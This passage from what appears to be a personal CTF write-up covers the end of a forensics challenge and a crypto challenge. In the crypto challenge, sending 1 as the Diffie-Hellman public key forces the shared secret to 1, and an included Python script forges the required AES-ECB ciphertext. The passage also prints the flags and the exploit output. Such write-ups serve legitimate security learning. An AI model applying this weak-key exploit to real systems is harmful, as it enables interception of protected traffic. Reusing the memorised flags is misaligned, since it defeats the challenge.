tmp = base64.b64encode(line.encode("ascii"))
result += "\"" + str(tmp, "ascii") + "\", " 
print(result)
```

The result was a list of base64 that I used in the windows VM once again
<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/automation_6.png" alt="drawing" width="350"/>
</p>

The output geve the 2nd part of the flag!
<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/forensics/automation_7.png" alt="drawing" width="350"/>
</p>


This 2nd part was a bit messed up but it was easy to rebuild by hand... putting it all toghether i got the flag
FLAG: **HTB{y0u_c4n_4utom4t3_but_y0u_c4nt_h1de}**


# Crypto

## Android-in-the-middle


Downloaded the python file and started analyzing it. It was useing Diffie Helman to calculate a shared key in order to decrypt a user input and match it to the string "Initialization Sequence - Code 0"

The script asked for the public key in memory and use that key to calculate the shared key... well if we just used "1" as the key, the shared key will be 1!

Tested it in debug mode and confirm it!

Coded an exploit to encrypt the string the application needed.

```python
from Crypto.Cipher import AES

import hashlib

import binascii

  

def encrypt(encrypted, shared_secret):

key = hashlib.md5(long_to_bytes(shared_secret)).digest()

cipher = AES.new(key, AES.MODE_ECB)

message = cipher.encrypt(str.encode(encrypted))

return message

  
  

sequence = "Initialization Sequence - Code 0"

p = 0x509efab16c5e2772fa00fc180766b6e62c09bdbd65637793c70b6094f6a7bb8189172685d2bddf87564fe2a6bc596ce28867fd7bbc300fd241b8e3348df6a0b076a0b438824517e0a87c38946fa69511f4201505fca11bc08f257e7a4bb009b4f16b34b3c15ec63c55a9dac306f4daa6f4e8b31ae700eba47766d0d907e2b9633a957f19398151111a879563cbe719ddb4a4078dd4ba42ebbf15203d75a4ed3dcd126cb86937222d2ee8bddc973df44435f3f9335f062b7b68c3da300e88bf1013847af1203402a3147b6f7ddab422d29d56fc7dcb8ad7297b04ccc52f7bc5fdd90bf9e36d01902e0e16aa4c387294c1605c6859b40dad12ae28fdfd3250a2e9

shared_secret = 1

  

encrypted_sequence = binascii.hexlify(encrypt(sequence, shared_secret))

  

print(encrypted_sequence)
```

The output was - 7fd4794e77290bf65808e95467f284966d71995c16e83da2192aecfd2d0df7a4
Starting the instance and connecting with nc i got the flag


<p align="center">
    <img src="/assets/images/ctf_cyberapocalypse2022/crypto/android_in_the_middle.png" alt="drawing" width="350"/>
</p>


# Web

## Coming soon
